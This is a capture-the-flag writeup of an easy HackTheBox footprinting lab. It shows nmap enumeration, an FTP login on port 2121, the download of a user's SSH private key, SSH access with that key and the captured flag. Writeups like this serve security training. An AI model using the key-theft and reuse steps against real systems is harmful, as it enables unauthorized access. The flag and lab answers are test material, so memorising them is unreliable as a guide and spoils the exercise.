# 🏴️ Footprinting Tests - Easy

> **Difficulty:** Easy | **OS:** Linux | **Platform:** CPTS — Footprinting Study

!!! info "About this page"
    Writeup of the footprinting lab (easy machine) from HackTheBox. Focus on
    service enumeration and gaining initial access via SSH key reuse.

---

## 📋 General Information

| Field | Value |
|:------|:------|
| **Hostname** | `NIXEASY` |
| **IP** | `10.129.14.129` |
| **OS** | Linux — Ubuntu 20.04.1 LTS |
| **Difficulty** | Easy |
| **Platform / Module** | CPTS — Footprinting |
| **Internal domain** | `inlanefreight.htb` |
| **Date** | 01/06/2026 |
| **Status** | Finished |

---

## 🔍 Initial Enumeration

### Ports and Services Found

| Port | Service | Version / Banner |
|:------|:--------|:----------------|
| 21 | ftp | ProFTPD — `ftp.int.inlanefreight.htb` |
| 22 | ssh | OpenSSH 8.2p1 Ubuntu |
| 53 | domain | ISC BIND 9.16.1 |
| 2121 | ftp | ProFTPD — *Ceil's FTP* |

### Enumeration Command

```bash
sudo nmap -sS -sV --top-ports 1000 -T4 10.129.14.129
```

### Relevant Output (evidence)

```shell
PORT     STATE SERVICE VERSION
21/tcp   open  ftp?
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ftp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Fingerprints dos serviços nao reconhecidos:
#  Port 21   -> 220 ProFTPD Server (ftp.int.inlanefreight.htb)
#  Port 2121 -> 220 ProFTPD Server (Ceil's FTP)
```

### Findings

- [x] Secondary FTP server on a **non-standard port (2121)** — "Ceil's FTP"
- [x] FTP banner reveals the **internal domain** `inlanefreight.htb`
- [x] SSH available (port 22) → potential key reuse

---

## 🎯 Techniques Used

| # | Technique | Where / How it was applied |
|:--|:--------|:-------------------------|
| 1 | Service enumeration (nmap) | Identified FTP on the non-standard port 2121 |
| 2 | FTP access | Logged into FTP 2121 as user `ceil` |
| 3 | SSH private key exfiltration | Downloaded `id_rsa` from `~/.ssh/` via FTP |
| 4 | SSH key reuse | `ssh -i id_rsa ceil@target` → shell as `ceil` |
| 5 | Flag location | Reading `/home/flag/flag.txt` |

---

## 🚀 Exploitation / Initial Access

### Entry Vector

| Field | Value |
|:------|:------|
| **Vector** | FTP (2121) → exposed SSH key |
| **Flaw exploited** | Private key `id_rsa` accessible/downloadable via FTP |
| **Tools** | nmap, ftp, ssh |
| **Access obtained as** | `ceil` |

!!! warning "FTP password"
    The FTP login as `ceil` succeeded (`230 User ceil logged in`), but
    **the password used is not recorded in this log**.

### Process

```
1. Enumerate ports → identify FTP on 2121 (Ceil's FTP)
2. Log into FTP 2121 as ceil and navigate to .ssh/
3. Download id_rsa (and authorized_keys, id_rsa.pub)
4. chmod 600 id_rsa
5. ssh -i id_rsa ceil@10.129.14.129 → shell as ceil
```

### Key Commands

```bash
ftp ceil@10.129.14.129 2121
# ftp> cd .ssh
# ftp> get id_rsa
# ftp> get authorized_keys
# ftp> get id_rsa.pub

chmod 600 id_rsa
ssh -i id_rsa ceil@10.129.14.129
```

### Evidence — key exfiltration via FTP

```shell
ftp> cd .ssh
250 CWD command successful
ftp> ls
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
ftp> get id_rsa
local: id_rsa remote: id_rsa
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
226 Transfer complete
3381 bytes received in 00:00 (405.52 KiB/s)
```

### Attempts that did NOT work

- `nano` / `vi` / `vim authorized_keys` **inside the FTP client** → `?Invalid command.`
- `cd .profile` and `cd authorized_keys` → `550 ...: Not a directory`

!!! tip "Lesson"
    The interactive FTP client doesn't edit remote files — it only transfers them.
    The correct path is to `get` the file and open it locally.

---

## 🐚 Shell and Post-Access

Access obtained as `ceil` via SSH with the exfiltrated key (Ubuntu 20.04.1 LTS).

### Users found (`/home`)

| User | Note |
|:--------|:-----------|
| `ceil` | user accessed |
| `cry0l1t3` | present in `/home` |
| `flag` | directory containing the flag |

### Credentials / Keys Found

| Type | Value / Location |
|:-----|:--------------|
| SSH private key | `id_rsa` downloaded from `~/.ssh/` of `ceil` via FTP 2121 |

### Evidence — SSH access and flag

```shell
└──╼ [★]$ chmod 600 id_rsa
└──╼ [★]$ ssh -i id_rsa ceil@10.129.14.129
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)
Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20

ceil@NIXEASY:~$ cd /home/flag/
ceil@NIXEASY:/home/flag$ cat flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

---

## 🚩 Flags

- [x] Flag captured

| Flag | Location |
|:-----|:------|
| `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}` | `/home/flag/flag.txt` |

!!! note
    The flag was obtained in `/home/flag/`. There was no access to `/root` in
    this log — so **there is no root flag** on record.

---

## 📖 Technical Summary

| Field | Value |
|:------|:------|
| **Root cause** | SSH private key exposed through an accessible FTP service |
| **Attack chain** | Enumeration (nmap) → FTP 2121 as `ceil` → download `id_rsa` → SSH as `ceil` → flag at `/home/flag/` |
| **Final access** | `ceil` (user) |

---

## 💡 Lessons Learned

- **What worked:** reusing the `id_rsa` exfiltrated from FTP to authenticate via SSH.
- **What slowed things down:** trying to edit files inside the FTP client (`nano`/`vi`/`vim`) — not supported.
- **Commands to review later:** enumerating services on **high/non-standard ports** (the relevant FTP was on 2121, not 21).
- **Techniques to study further:** after gaining any file access, always check `~/.ssh/` for readable private keys.
